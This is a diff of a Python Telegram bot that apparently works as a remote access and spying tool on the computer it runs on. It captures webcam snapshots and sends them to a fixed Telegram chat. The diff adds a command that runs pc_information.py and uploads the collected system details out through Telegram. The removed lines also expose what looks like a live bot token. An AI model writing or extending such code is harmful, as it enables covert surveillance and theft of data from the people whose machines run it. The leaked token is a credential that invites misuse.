@@ -3,15 +3,12 @@ import cv2
 from telebot import types
 from PIL import ImageGrab
 import os
+import time
 import pyautogui
-import getpass
-import psutil
-from datetime import datetime
-from uuid import getnode as get_mac
-import socket
 
-bot = telebot.TeleBot("5377433922:AAG4QIoFIbtv587e4QJ9a7bo1AKtB4zxK6I")
-ID: int = 886293441
+bot = telebot.TeleBot("Token")
+ID: int =#you telegram id
+
 
 
 @bot.message_handler(commands=['start', 'help'])
@@ -46,12 +43,14 @@ def func(message):
             cap = cv2.VideoCapture(0)
             for i in range(30):
                 cap.read()
-            ret, frame = cap.read()
-            cv2.imwrite('cam.png', frame)
+            ret, image = cap.read()
+            cv2.imwrite('cam.png', image)
             cap.release()
             photo = open('cam.png', 'rb')
             bot.send_message(ID, "Знімок з камери")
             bot.send_photo(ID, photo)
+            photo.close()
+
 
 ###########################################################################
 
@@ -124,7 +123,12 @@ def func(message):
                              reply_markup=reply_curcor)
 ###########################################################################
 
-
+        elif message.text == "Отримати данні комп'ютера":
+            bot.send_message(ID, text="Ща брат 5 сек".format(message.from_user))
+            os.system("python pc_information.py")
+            time.sleep(5)
+            doc = open("info.txt", "rb")
+            bot.send_document(ID, doc)
 
 ###########################################################################
 
